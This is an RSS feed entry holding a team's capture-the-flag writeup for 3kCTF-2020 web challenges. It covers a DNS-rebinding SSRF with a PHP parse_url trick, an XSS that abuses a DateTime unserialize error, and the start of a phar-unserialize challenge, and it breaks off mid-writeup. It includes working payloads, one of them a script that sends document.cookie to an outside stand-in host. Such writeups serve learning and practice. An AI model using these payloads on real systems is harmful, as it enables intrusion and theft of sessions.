<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>pwnthybytes-ctf on Black Bauhinia</title>
    <link>https://b6a.black/tags/pwnthybytes-ctf/</link>
    <description>Black Bauhinia (pwnthybytes-ctf)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 28 Jul 2020 11:36:00 +0800</lastBuildDate>
    
    <atom:link href="https://b6a.black/tags/pwnthybytes-ctf/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>3kCTF-2020 Writeup</title>
      <link>https://b6a.black/posts/2020-07-28-3kctf/</link>
      <pubDate>Tue, 28 Jul 2020 11:36:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-28-3kctf/</guid>
      <description>&lt;h2 id=&#34;reporter-web-498-points&#34;&gt;reporter (Web; 498 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;apple&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Author: rekter0&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Reporter is an online markdown reporting tool.
it&#39;s free to use for everyone.
there&#39;s a secret report we need located &lt;a href=&#34;http://reporter.3k.ctf.to/secret_report&#34;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/src&#34;&gt;source&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;walkthrough&#34;&gt;Walkthrough&lt;/h3&gt;

&lt;p&gt;The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the &#39;report&#39;.&lt;/p&gt;

&lt;p&gt;There are 4 buttons on the interface: &lt;code&gt;Edit&lt;/code&gt;, &lt;code&gt;Preview&lt;/code&gt;, &lt;code&gt;Save&lt;/code&gt;, and &lt;code&gt;Deliver&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The first target of the challenge is to access the &lt;code&gt;secret_report&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;curl http://reporter.3k.ctf.to/secret_report
&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;403 Forbidden&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Well, knew that.&lt;/p&gt;

&lt;h4 id=&#34;exploiting-toctou-of-the-domain-checking&#34;&gt;Exploiting TOCTOU of the domain checking&lt;/h4&gt;

&lt;p&gt;Interesting things happen in &lt;a href=&#34;https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/src/backend.php&#34;&gt;backend.php&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;if(@$_POST[&amp;#39;deliver&amp;#39;]){
	$thisDoc=file_get_contents($dir.&amp;#39;/file.html&amp;#39;);
	$images = preg_match_all(&amp;#34;/&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\&amp;#34;(.*?)\&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&amp;#34;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;thisDoc&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;matches&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;foreach&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;($&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;matches&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;key &lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$value)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
		&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;thisDoc &lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;str_replace($value&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data:image&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;png&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;base64&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&amp;#34;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;base64_encode&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch_remote_file&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;($&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;thisDoc&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When user click on the &lt;code&gt;deliver&lt;/code&gt; button it will get the saved document, &lt;code&gt;fetch_remote_file&lt;/code&gt; and embed it to the report with &lt;code&gt;base64&lt;/code&gt;. Therefore users can embed images from external image hosting sites such as imgur etc.&lt;/p&gt;

&lt;p&gt;How about embedding the &lt;code&gt;secret_report&lt;/code&gt;? It does not work as it do a long list of checks:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;function fetch_remote_file($url) {
    $config[&amp;#39;disallowed_remote_hosts&amp;#39;] = array(&amp;#39;localhost&amp;#39;);
    $config[&amp;#39;disallowed_remote_addresses&amp;#39;] = array(&amp;#34;0.0.0.0/8&amp;#34;, &amp;#34;10.0.0.0/8&amp;#34;, &amp;#34;100.64.0.0/10&amp;#34;, &amp;#34;127.0.0.0/8&amp;#34;, &amp;#34;169.254.0.0/16&amp;#34;, &amp;#34;172.16.0.0/12&amp;#34;, &amp;#34;192.0.0.0/29&amp;#34;, &amp;#34;192.0.2.0/24&amp;#34;, &amp;#34;192.88.99.0/24&amp;#34;, &amp;#34;192.168.0.0/16&amp;#34;, &amp;#34;198.18.0.0/15&amp;#34;, &amp;#34;198.51.100.0/24&amp;#34;, &amp;#34;203.0.113.0/24&amp;#34;, &amp;#34;224.0.0.0/4&amp;#34;, &amp;#34;240.0.0.0/4&amp;#34;,);

    // ...

    $addresses = get_ip_by_hostname($url_components[&amp;#39;host&amp;#39;]);
    $destination_address = $addresses[0];

    // ... checks if the destination_address is in the disallowed list ...

    $opts = array(&amp;#39;http&amp;#39; =&amp;gt; array(&amp;#39;follow_location&amp;#39; =&amp;gt; 0,));
    $context = stream_context_create($opts);
    return file_get_contents($url, false, $context);
}
function get_ip_by_hostname($hostname) {
    $addresses = @gethostbynamel($hostname);
    if (!$addresses) {
      // ... more attempts to get dns A records ...
    }
    return $addresses;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If we change the DNS record very quickly, which the DNS server return &lt;code&gt;1.1.1.1&lt;/code&gt; at &lt;code&gt;get_ip_by_hostname&lt;/code&gt; when it do the checking, and we return &lt;code&gt;127.0.0.1&lt;/code&gt; at &lt;code&gt;file_get_contents&lt;/code&gt; we can access the &lt;code&gt;localhost&lt;/code&gt; and maybe we can get the &lt;code&gt;secret_report&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Therefore I wrote a &lt;a href=&#34;https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/dnsrebind.js&#34;&gt;script&lt;/a&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:dns-rebind&#34;&gt;&lt;a class=&#34;footnote&#34; href=&#34;#fn:dns-rebind&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; to act as a nameserver and give different responses.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ dig +short 4kctf.example.com @8.8.8.8
1.1.1.1
$ dig +short 4kctf.example.com @8.8.8.8
127.0.0.1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;![](http://4kctf.example.com/secret_report/)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The result is a file listing with two files:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;3ac45ca05705d39ed27d7baa8b70ecd560b69902.php
secret2

63b4bacc828939706ea2a84822a4505efa73ee3e.php
not much here&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;3ac45ca05705d39ed27d7baa8b70ecd560b69902.php&lt;/code&gt; is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.&lt;/p&gt;

&lt;h4 id=&#34;wonders-of-php-empty0--true&#34;&gt;Wonders of PHP: empty(&amp;quot;0&amp;quot;) == true&lt;/h4&gt;

&lt;p&gt;I crafted this payload to read the file and get the flag.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Back to the &lt;code&gt;backend.php&lt;/code&gt; &lt;code&gt;fetch_remote_file&lt;/code&gt;, besides DNS checking it also &lt;code&gt;parse_url&lt;/code&gt; and checks &lt;code&gt;scheme&lt;/code&gt;, &lt;code&gt;port&lt;/code&gt;, etc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;function fetch_remote_file($url) {
    // ...
    $url_components = @parse_url($url);
    if (!isset($url_components[&amp;#39;scheme&amp;#39;])) {
        return false;
    }
    if (@($url_components[&amp;#39;port&amp;#39;])) {
        return false;
    }
    if (!$url_components) {
        return false;
    }
    if ((!empty($url_components[&amp;#39;scheme&amp;#39;]) &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; !in_array($url_components[&amp;#39;scheme&amp;#39;], array(&amp;#39;http&amp;#39;, &amp;#39;https&amp;#39;)))) {
        return false;
    }
    if (array_key_exists(&amp;#34;user&amp;#34;, $url_components) || array_key_exists(&amp;#34;pass&amp;#34;, $url_components)) {
        return false;
    }
    // ...
    return file_get_contents($url, false, $context);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;parse_url&lt;/code&gt; will parse as follows&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;array(2) {
  [&amp;#34;scheme&amp;#34;]=&amp;gt;
  string(1) &amp;#34;0&amp;#34;
  [&amp;#34;path&amp;#34;]=&amp;gt;
  string(62) &amp;#34;/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php&amp;#34;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Where the &lt;code&gt;scheme&lt;/code&gt; will return &lt;code&gt;true&lt;/code&gt; for &lt;code&gt;isset&lt;/code&gt; and &lt;code&gt;true&lt;/code&gt; for &lt;code&gt;empty&lt;/code&gt; (&lt;code&gt;empty(&amp;quot;0&amp;quot;) == true&lt;/code&gt;), and for &lt;code&gt;file_get_contents&lt;/code&gt; it will recognize &lt;code&gt;0:&lt;/code&gt; as a folder and &lt;code&gt;0:/../&lt;/code&gt; as current folder.&lt;/p&gt;

&lt;h2 id=&#34;xsser-web-499-points&#34;&gt;xsser (Web; 499 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;challenge&lt;/p&gt;

&lt;p&gt;Author: Dali&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;walkthrough-1&#34;&gt;Walkthrough&lt;/h3&gt;

&lt;p&gt;Source code is provided:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;

{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $name;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $isAdmin;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct($nam)
    {
        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $nam;
        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isAdmin&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;;
    }
}

&lt;span style=&#34;color:#a6e22e&#34;&gt;ob_start&lt;/span&gt;();
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;]))){
    $use&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;);
    $log&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($use);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location: ?login=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$log&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();

}

$new_name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;new&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($new_name)){


  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($new_name, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;script&amp;#39;&lt;/span&gt;))&lt;span style=&#34;color:#75715e&#34;&gt;//no xss :p 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                 { 
                    $new_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;htmlentities&lt;/span&gt;($new_name);
                 }
        $new_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;substr&lt;/span&gt;($new_name, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;h1 style=&amp;#34;text-align:center&amp;#34;&amp;gt;Error! Your msg &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$new_name&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;h1&amp;gt;Contact admin /req.php &amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;;

}
 &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;){
            &lt;span style=&#34;color:#a6e22e&#34;&gt;setcookie&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;session&amp;#34;&lt;/span&gt;, $flag, &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3600&lt;/span&gt;);
        }
$check&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;substr&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;));
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($check&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isAdmin&lt;/span&gt;){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;welcome back admin &amp;#39;&lt;/span&gt;;
}
&lt;span style=&#34;color:#a6e22e&#34;&gt;ob_end_clean&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;From the challenge name it is about XSS. After setting &lt;code&gt;$_GET[&#39;login&#39;]&lt;/code&gt;, you can enter something in &lt;code&gt;$_GET[&#39;new&#39;]&lt;/code&gt;, which is supposed to be reflected on the page for XSS.&lt;/p&gt;

&lt;p&gt;Thanks to &lt;code&gt;ob_start();&lt;/code&gt; and &lt;code&gt;ob_end_clean();&lt;/code&gt;, nothing about the user input are printed in the normal case.&lt;/p&gt;

&lt;p&gt;To address this, we can make the interpreter panic before &lt;code&gt;ob_end_clean();&lt;/code&gt;.  Maybe &lt;code&gt;unserialize&lt;/code&gt; could do so?&lt;/p&gt;

&lt;p&gt;But most of the time &lt;code&gt;unserialize&lt;/code&gt; just returns FALSE when you input some garbage that is &amp;quot;un-unserialize-able&amp;quot; (pun intended)&lt;/p&gt;

&lt;p&gt;Let&#39;s try to unserialize some meaningful junks:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;get_declared_classes&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; $c) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;O:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($c)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#34;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;:0:{}&amp;#39;&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It shows &lt;code&gt;Fatal error: Uncaught Error: Invalid serialization data for DateTime object&lt;/code&gt;. So &lt;code&gt;DateTime&lt;/code&gt; should do the trick.&lt;/p&gt;

&lt;p&gt;How about the actual XSS payload? We can&#39;t use &lt;code&gt;&amp;lt;script src=//blah&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For some reason &lt;code&gt;script&amp;lt;script src=//blah&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; could bypass that &lt;code&gt;stripos&lt;/code&gt; but it is too long.&lt;/p&gt;

&lt;p&gt;Later on I found that &lt;code&gt;/req.php&lt;/code&gt; accepts external URLs as well. So we can use some other tricks like &lt;code&gt;window.name&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;name=&amp;#39;location=&amp;#34;//blah/&amp;#34;+document.cookie&amp;#39;;location=&amp;#39;//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E&amp;amp;login=O:8:%22DateTime%22:0:%7B%7D&amp;#39;;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;remarks&#34;&gt;Remarks&lt;/h3&gt;

&lt;p&gt;At first I tried the payload with iframe but Chrome blocks the &lt;code&gt;Set-Cookie&lt;/code&gt; header due to &amp;quot;third-party cookies preference&amp;quot;.&lt;/p&gt;

&lt;p&gt;Then I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.&lt;/p&gt;

&lt;h2 id=&#34;image-uploader-web-498-points&#34;&gt;image uploader (Web; 498 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;description-1&#34;&gt;Description&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;challenge&lt;/p&gt;

&lt;p&gt;source&lt;/p&gt;

&lt;p&gt;Author: Dali&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;題解-walkthrough&#34;&gt;題解 (Walkthrough)&lt;/h3&gt;

&lt;p&gt;我知你睇唔明廣東話架啦. 今次有翻譯.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;I know you don&#39;t understand Cantonese. This time got translation.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;個 description 得兩條&lt;a href=&#34;https://www.google.com/search?q=goodsmile+5678&#34;&gt;奸笑5678&lt;/a&gt;. 是但啦有醬油有計傾.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;(Some unimportant gibberish)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一開 &lt;code&gt;index.php&lt;/code&gt; 就見到 &lt;code&gt;include(&#39;old.php&#39;);//todo remove this useless file :\&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;After opening &lt;code&gt;index.php&lt;/code&gt; then we can see that include stuff...&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;明眼人一睇就知係伏啦. 一睇兩個 Class 重唔係玩 unserialize.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Obviously it is the vulnerable point. It contains 2 classes so obviously it is about unserialize.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;碌落 D (唔好譯啦你譯唔到個 D 架啦) 個 index.php 見到 file_get_contents. 條件反射 phar unserialize&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Scroll down [Don&#39;t translate that &amp;quot;D&amp;quot;, you can&#39;t] that index.php, we can see &lt;code&gt;file_get_contents&lt;/code&gt;. It immediately links to phar unserialize&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;有個 &lt;code&gt;upload.php&lt;/code&gt; 真係可以 upload 野. 不過會 check &lt;code&gt;getimagesize&lt;/code&gt; 同 &lt;code&gt;image/jpeg&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is an &lt;code&gt;upload.php&lt;/code&gt; that can really upload things. But it checks with &lt;code&gt;getimagesize&lt;/code&gt; and &lt;code&gt;image/jpeg&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;睇返個 &lt;code&gt;old.php&lt;/code&gt;, 又係驗眼嘅時間. 最底有個 &lt;code&gt;$data = &amp;quot;&amp;lt;?php\n//&amp;quot; . sprintf(&#39;%012d&#39;, $expire) . &amp;quot;\n exit();?&amp;gt;\n&amp;quot; . $data;&lt;/code&gt; 但係無咩用.&lt;/p&gt;

&lt;blockquote&gt;
